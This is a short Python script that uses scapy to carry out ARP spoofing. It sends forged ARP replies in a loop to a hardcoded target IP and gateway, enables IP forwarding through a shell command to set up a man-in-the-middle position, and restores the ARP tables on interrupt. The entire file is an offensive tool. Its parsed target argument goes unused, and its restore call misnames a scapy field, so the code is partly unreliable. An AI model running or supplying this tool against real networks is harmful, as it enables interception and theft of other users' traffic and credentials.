#/usr/bin/env python

import scapy.all as scapy
import argparse  # Allows to create arguments
import subprocess  # Run SO code
import time

argument_list = [
    {
     "short_code": "-t",
     "code": "--target",
     "dest": "raw_target",
     "help_text": "Target who will be tested"
    },
]

# Using optparse and the argument list above to generate the command arguments
def get_arguments(argument_list):
    # Creating an instance of optparse
    parser = argparse.ArgumentParser()
    # Adding arguments to the parser
    for argument in argument_list:
        parser.add_argument(argument["short_code"], argument["code"], dest=argument["dest"], help=argument["help_text"])
    options = parser.parse_args()
    return options


# Getting options and arguments from parser
options = get_arguments(argument_list)

# Setting into variables the options acquired from the function above
raw_target = options.raw_target

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=10, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # op = 1 - request; 2 - response / pdst = target ip / hwdst = target mac address / psrc = address we're faking for the target
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(OP=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = "10.70.128.97"
gateway_ip = "10.70.0.3"


def arp_spoof():
    sent_packets_count = 0
    first_packets_sent = False
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            if not first_packets_sent:
                subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
                first_packets_sent = True
            sent_packets_count = sent_packets_count + 2
            print("\r[+] Packets sent: " + str(sent_packets_count), end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("[+] Detected CTRL + C ..... Resetting ARP tables..... Please wait.")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
    except IndexError:
        print("[+] Index error, running again")
        arp_spoof()


arp_spoof()


